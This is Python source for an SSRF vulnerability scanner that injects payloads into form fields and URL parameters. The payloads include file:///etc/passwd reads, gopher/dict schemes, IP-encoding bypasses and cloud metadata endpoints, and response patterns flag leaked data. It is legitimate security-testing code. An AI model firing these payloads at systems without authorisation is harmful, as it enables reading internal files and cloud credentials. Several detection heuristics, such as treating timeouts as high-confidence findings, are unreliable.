import re
import requests
from requests.adapters import HTTPAdapter
import time
import random
import string
import asyncio
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Any, Optional

class SSRFScanner:
    """Scanner for Server-Side Request Forgery (SSRF) vulnerabilities - GUI adapted version"""
    
    # Common SSRF payloads
    SSRF_PAYLOADS = [
        # Internal network ranges
        "http://127.0.0.1:80",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:5432",
        "http://localhost",
        "http://0.0.0.0",
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        
        # Alternative representations
        "http://127.1",
        "http://127.000.000.1",
        "http://2130706433",  # 127.0.0.1 in decimal
        "http://0x7f000001",  # 127.0.0.1 in hex
        "http://[::1]",       # IPv6 localhost
        
        # URL encoding bypasses
        "http://127.0.0.1%2380",
        "http://127.0.0.1%23:80",
        "http://127.0.0.1%0A",
        "http://127.0.0.1%0D",
        
        # Protocol variations
        "file:///etc/passwd",
        "file:///c:/windows/system32/drivers/etc/hosts",
        "gopher://127.0.0.1:80",
        "dict://127.0.0.1:80",
        "ftp://127.0.0.1",
        "ldap://127.0.0.1",
        
        # Cloud metadata endpoints
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance/",
    "http://169.254.169.254/v1/meta-data/",
    # DNS rebinding / wildcard to localhost services
    "http://spoofed.burpcollaborator.net",
    "http://localtest.me",
    "http://127.0.0.1.nip.io",
    ]
    
    # Time-based detection thresholds
    TIMEOUT_THRESHOLD = 2  # seconds (reduced for speed)
    FAST_TIMEOUT = 1       # seconds for internal/localhost tests
    NORMAL_RESPONSE_TIME = 2  # seconds
    
    # Response patterns that might indicate SSRF
    SSRF_INDICATORS = [
        # Error messages
        r'connection refused',
        r'connection timed out',
        r'connection reset',
        r'no route to host',
        r'network is unreachable',
        r'operation timed out',
        
        # File access indicators
        r'root:x:0:0:',
        r'\[boot loader\]',
        r'# Copyright.*Windows',
        
        # Internal service responses
        r'mysql.*version',
        r'redis.*version',
        r'postgresql.*version',
        r'ssh.*version',
        r'apache.*version',
        r'nginx.*version',
        
        # Cloud metadata responses
        r'ami-[0-9a-f]+',
        r'instance-id',
        r'instance-type',
        r'local-ipv4',
        r'security-groups'
    ]
    
    def __init__(self, websocket_manager=None):
        self.websocket_manager = websocket_manager
        self.scan_id = None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'VulnPy Security Scanner/1.0',
            'Connection': 'keep-alive'
        })
        # Connection pooling for speed
        adapter = HTTPAdapter(pool_connections=10, pool_maxsize=20, max_retries=0)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        self._cancel = False

        # Priority payloads (most effective first)
        self.PRIORITY_PAYLOADS = [
            "http://127.0.0.1:80",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "http://127.0.0.1:22",
            "http://metadata.google.internal/computeMetadata/v1/",
        ]
        
    def set_scan_id(self, scan_id: str):
        self.scan_id = scan_id
    
    def cancel(self):
        self._cancel = True
        
    async def send_websocket_message(self, message: Dict[str, Any]):
        """Send message via WebSocket if manager is available"""
        if self.websocket_manager:
            try:
                await self.websocket_manager.send_message(message)
            except Exception as e:
                print(f"WebSocket send error: {e}")
                
    def log(self, message, level="INFO"):
        """Log message with WebSocket support"""
        print(f"[{level}] {message}")
        
        if self.websocket_manager:
            try:
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    asyncio.create_task(self.send_websocket_message({
                        "type": "log",
                        "level": level.lower(),
                        "message": message,
                        "timestamp": time.time(),
                        "scan_id": self.scan_id,
                        "phase": "ssrf"
                    }))
            except Exception as e:
                print(f"Logging error: {e}")

    async def scan(self, attack_surface: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Main scanning method"""
        findings = []
        
        # Get URLs from attack surface
        for url, forms in attack_surface.get('urls', []):
            self.log(f"Testing {url} for SSRF vulnerabilities...")
            
            # Test forms for SSRF
            for form in forms:
                if self._cancel:
                    break
                findings.extend(await self._test_form_ssrf(url, form))
                
            # Test URL parameters for SSRF
            if self._cancel:
                break
            findings.extend(await self._test_url_parameters_ssrf(url))
            
            # Tiny pacing to avoid hammering
            await asyncio.sleep(0.01)
        
        return findings

    async def _test_form_ssrf(self, url: str, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test form inputs for SSRF vulnerabilities"""
        findings = []
        
        try:
            form_action = form.get('action', '')
            form_method = form.get('method', 'GET').upper()
            raw_inputs = form.get('inputs', {})
            # Normalize inputs: our crawler provides a list of names; other sources may provide a dict
            if isinstance(raw_inputs, list):
                form_inputs: Dict[str, Dict[str, Any]] = {name: {"type": "text", "value": ""} for name in raw_inputs}
            elif isinstance(raw_inputs, dict):
                # Ensure each value is a dict with at least type/value
                form_inputs = {}
                for name, info in raw_inputs.items():
                    if isinstance(info, dict):
                        form_inputs[name] = {
                            "type": str(info.get("type", "text")).lower(),
                            "value": info.get("value", ""),
                        }
                    else:
                        form_inputs[name] = {"type": "text", "value": info or ""}
            else:
                form_inputs = {}
            
            # Determine the target URL
            if form_action:
                if form_action.startswith('http'):
                    target_url = form_action
                else:
                    target_url = urljoin(url, form_action)
            else:
                target_url = url
            
            self.log(f"Testing form at {target_url} for SSRF")
            
            # Test each input that might accept URLs
            for input_name, input_info in form_inputs.items():
                input_type = input_info.get('type', 'text').lower()
                if self._cancel:
                    break
                
                # Focus on inputs likely to accept URLs
                if self._is_url_parameter(input_name, input_type):
                    findings.extend(await self._test_parameter_ssrf(
                        target_url, input_name, form_inputs, form_method
                    ))
                    
        except Exception as e:
            self.log(f"Error testing form SSRF at {url}: {e}", "ERROR")
            
        return findings

    async def _test_url_parameters_ssrf(self, url: str) -> List[Dict[str, Any]]:
        """Test URL parameters for SSRF vulnerabilities"""
        findings = []
        
        try:
            parsed = urlparse(url)
            if not parsed.query:
                return findings
                
            params = parse_qs(parsed.query, keep_blank_values=True)
            
            for param_name, param_values in params.items():
                if self._is_url_parameter(param_name):
                    self.log(f"Testing URL parameter {param_name} for SSRF")
                    
                    # Create base parameters
                    test_params = {}
                    for p, v in params.items():
                        test_params[p] = v[0] if v else ''
                    
                    # Test smart/prioritized payloads first (limit small set)
                    payloads = self._get_smart_payloads(param_name)
                    for payload in payloads:
                        test_params[param_name] = payload
                        
                        # Construct test URL
                        test_query = urlencode(test_params)
                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, test_query, parsed.fragment
                        ))
                        
                        if self._cancel:
                            break
                        finding = await self._test_ssrf_payload(test_url, param_name, payload)
                        if finding:
                            findings.append(finding)
                            # Circuit breaker: stop after first positive
                            break
                        await asyncio.sleep(0.01)
                        
        except Exception as e:
            self.log(f"Error testing URL parameters for SSRF at {url}: {e}", "ERROR")
            
        return findings

    async def _test_parameter_ssrf(self, url: str, param_name: str, form_inputs: Dict[str, Any], method: str) -> List[Dict[str, Any]]:
        """Test a specific parameter for SSRF with smart selection and early exit"""
        findings: List[Dict[str, Any]] = []
        try:
            # Prepare form data template
            form_data: Dict[str, str] = {}
            if isinstance(form_inputs, dict):
                for input_name, input_info in form_inputs.items():
                    default_val = ""
                    if isinstance(input_info, dict):
                        default_val = str(input_info.get('value', ''))
                    elif isinstance(input_info, list):
                        default_val = ''
                    else:
                        default_val = str(input_info)
                    form_data[input_name] = '' if input_name == param_name else default_val
            elif isinstance(form_inputs, list):
                for name in form_inputs:
                    form_data[name] = '' if name == param_name else ''

            # Smart payloads
            payloads = self._get_smart_payloads(param_name)

            # Concurrent testing of a small set of payloads
            tasks = []
            for payload in payloads:
                if self._cancel:
                    break
                fd = dict(form_data)
                fd[param_name] = payload
                tasks.append(self._test_ssrf_form_payload(url, param_name, fd, method, payload))

            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for r in results:
                    if isinstance(r, dict) and r:
                        findings.append(r)
                        break  # Circuit breaker after first finding

        except Exception as e:
            self.log(f"Error testing parameter {param_name} for SSRF: {e}", "ERROR")
        return findings

    async def _test_ssrf_payload(self, test_url: str, param_name: str, payload: str) -> Optional[Dict[str, Any]]:
        """Test a single SSRF payload via URL parameters"""
        try:
            start_time = time.time()
            timeout = self.FAST_TIMEOUT if self._is_internal_payload(payload) else self.TIMEOUT_THRESHOLD
            response = await asyncio.to_thread(
                self.session.get,
                test_url,
                timeout=timeout,
                allow_redirects=False,
            )
            response_time = time.time() - start_time
            return self._analyze_ssrf_response(test_url, param_name, payload, response, response_time)
        except requests.exceptions.Timeout:
            # Timeout might indicate SSRF (trying to connect to internal service)
            if 'localhost' in payload or '127.0.0.1' in payload:
                return {
                    'type': 'Server-Side Request Forgery',
                    'severity': 'High',
                    'url': test_url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f'Request timeout when testing {payload} - possible SSRF',
                    'remediation': 'Implement proper input validation and whitelist allowed URLs/domains',
                    'confidence': 'Medium'
                }
        except requests.exceptions.ConnectionError as e:
            # Connection errors to internal targets can be indicative
            if 'localhost' in payload or '127.0.0.1' in payload:
                return {
                    'type': 'Server-Side Request Forgery',
                    'severity': 'High',
                    'url': test_url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f'Connection error when testing {payload}: {str(e)[:100]}',
                    'remediation': 'Implement proper input validation and whitelist allowed URLs/domains',
                    'confidence': 'High'
                }
        except Exception as e:
            # Other exceptions might also indicate SSRF
            error_message = str(e).lower()
            if any(indicator in error_message for indicator in ['connection', 'network', 'timeout']):
                return {
                    'type': 'Server-Side Request Forgery',
                    'severity': 'Medium',
                    'url': test_url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f'Network error when testing {payload}: {error_message}',
                    'remediation': 'Implement proper input validation and network access controls',
                    'confidence': 'Low'
                }
        return None

    async def _test_ssrf_form_payload(self, url: str, param_name: str, form_data: Dict[str, str], method: str, payload: str) -> Optional[Dict[str, Any]]:
        """Test a single SSRF payload via form submission"""
        try:
            start_time = time.time()
            timeout = self.FAST_TIMEOUT if self._is_internal_payload(payload) else self.TIMEOUT_THRESHOLD
            if method == 'POST':
                response = await asyncio.to_thread(
                    self.session.post,
                    url,
                    data=form_data,
                    timeout=timeout,
                    allow_redirects=False,
                )
            else:
                params = urlencode(form_data)
                test_url = f"{url}?{params}" if '?' not in url else f"{url}&{params}"
                response = await asyncio.to_thread(
                    self.session.get,
                    test_url,
                    timeout=timeout,
                    allow_redirects=False,
                )
            response_time = time.time() - start_time
            return self._analyze_ssrf_response(url, param_name, payload, response, response_time)
        except requests.exceptions.Timeout:
            # Timeout might indicate SSRF
            if 'localhost' in payload or '127.0.0.1' in payload:
                return {
                    'type': 'Server-Side Request Forgery',
                    'severity': 'High',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f'Request timeout when testing {payload} via form - possible SSRF',
                    'remediation': 'Implement proper input validation and whitelist allowed URLs/domains',
                    'confidence': 'Medium'
                }
        except requests.exceptions.ConnectionError as e:
            if 'localhost' in payload or '127.0.0.1' in payload:
                return {
                    'type': 'Server-Side Request Forgery',
                    'severity': 'High',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f'Connection error when testing {payload} via form: {str(e)[:100]}',
                    'remediation': 'Implement proper input validation and whitelist allowed URLs/domains',
                    'confidence': 'High'
                }
        except Exception as e:
            # Other exceptions might also indicate SSRF
            error_message = str(e).lower()
            if any(indicator in error_message for indicator in ['connection', 'network', 'timeout']):
                return {
                    'type': 'Server-Side Request Forgery',
                    'severity': 'Medium',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f'Network error when testing {payload} via form: {error_message}',
                    'remediation': 'Implement proper input validation and network access controls',
                    'confidence': 'Low'
                }
        return None

    def _analyze_ssrf_response(self, url: str, param_name: str, payload: str, response: requests.Response, response_time: float) -> Optional[Dict[str, Any]]:
        """Analyze response for SSRF indicators"""
        # Status code heuristics for internal targets
        suspicious_status_codes = [403, 500, 502, 503, 504]
        if response.status_code in suspicious_status_codes and ('localhost' in payload or '127.0.0.1' in payload):
            return {
                'type': 'Server-Side Request Forgery',
                'severity': 'Medium',
                'url': url,
                'parameter': param_name,
                'payload': payload,
                'evidence': f'Suspicious status code {response.status_code} when testing internal URL',
                'remediation': 'Implement proper input validation and network access controls',
                'confidence': 'Medium'
            }

        # Check response content for SSRF indicators
        response_text = response.text.lower()
        for indicator_pattern in self.SSRF_INDICATORS:
            if re.search(indicator_pattern, response_text, re.IGNORECASE):
                severity = 'High'
                confidence = 'High'
                # Determine severity based on what was found
                if 'root:x:0:0:' in response_text or 'boot loader' in response_text:
                    severity = 'Critical'
                elif any(service in indicator_pattern for service in ['mysql', 'redis', 'postgresql']):
                    severity = 'High'
                elif 'connection' in indicator_pattern:
                    severity = 'Medium'
                    confidence = 'Medium'
                return {
                    'type': 'Server-Side Request Forgery',
                    'severity': severity,
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f'SSRF indicator found in response: {indicator_pattern}',
                    'remediation': 'Implement proper input validation, URL whitelisting, and network segmentation',
                    'confidence': confidence
                }

        # Check for suspicious response times (might indicate internal network access)
        if response_time > self.NORMAL_RESPONSE_TIME * 2 and ('localhost' in payload or '127.0.0.1' in payload):
            return {
                'type': 'Server-Side Request Forgery',
                'severity': 'Medium',
                'url': url,
                'parameter': param_name,
                'payload': payload,
                'evidence': f'Unusual response time ({response_time:.2f}s) when testing internal URL',
                'remediation': 'Implement proper input validation and network access controls',
                'confidence': 'Low'
            }

        # Check for different response lengths (might indicate successful internal requests)
        if response.status_code == 200 and len(response.text) > 1000:
            if 'localhost' in payload or '127.0.0.1' in payload or '169.254.169.254' in payload:
                return {
                    'type': 'Server-Side Request Forgery',
                    'severity': 'Medium',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f'Large response ({len(response.text)} bytes) when testing internal URL',
                    'remediation': 'Implement proper input validation and URL whitelisting',
                    'confidence': 'Low'
                }

        return None

    def _is_url_parameter(self, param_name: str, param_type: str = 'text') -> bool:
        """Check if a parameter is likely to accept URLs"""
        url_indicators = [
            'url', 'uri', 'link', 'href', 'src', 'redirect', 'callback',
            'return', 'next', 'goto', 'target', 'destination', 'location',
            'path', 'file', 'image', 'img', 'pic', 'photo', 'avatar',
            'proxy', 'fetch', 'load', 'import', 'include', 'require'
        ]
        
        param_lower = param_name.lower()
        
        # Check if parameter name contains URL indicators
        if any(indicator in param_lower for indicator in url_indicators):
            return True
            
        # Check if parameter type suggests URL input
        if param_type in ['url', 'text', 'search']:
            return True
            
        return False

    def _generate_canary_url(self) -> str:
        """Generate a unique canary URL for out-of-band testing"""
        # Consider using real services like interact.sh or webhook.site in production
        canary_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"http://{canary_id}.webhook.site"

    def _is_internal_payload(self, payload: str) -> bool:
        pl = payload.lower()
        return any(x in pl for x in ["127.0.0.1", "localhost", "169.254.169.254", "localtest.me", "127.0.0.1.nip.io"]) or pl.startswith("file://")

    def _get_smart_payloads(self, param_name: str) -> List[str]:
        """Return targeted payloads based on parameter name/type with priorities first"""
        pl = param_name.lower()
        # File-leaning params
        if any(x in pl for x in ['file', 'path', 'img', 'image', 'avatar', 'photo']):
            base = [
                "file:///etc/passwd",
                "file:///c:/windows/system32/drivers/etc/hosts",
                "http://127.0.0.1:80",
            ]
        # URL/redirect style
        elif any(x in pl for x in ['url', 'redirect', 'callback', 'return', 'next', 'goto', 'target']):
            base = [
                "http://127.0.0.1:80",
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost",
            ]
        else:
            base = ["http://127.0.0.1:80", "http://localhost"]

        # Ensure priority payloads lead and dedupe while keeping order
        combined = self.PRIORITY_PAYLOADS + [p for p in base if p not in self.PRIORITY_PAYLOADS]
        # Add a couple of DNS rebinding candidates
        for extra in ["http://localtest.me", "http://127.0.0.1.nip.io"]:
            if extra not in combined:
                combined.append(extra)
        # Limit to a small set for speed
        return combined[:4]
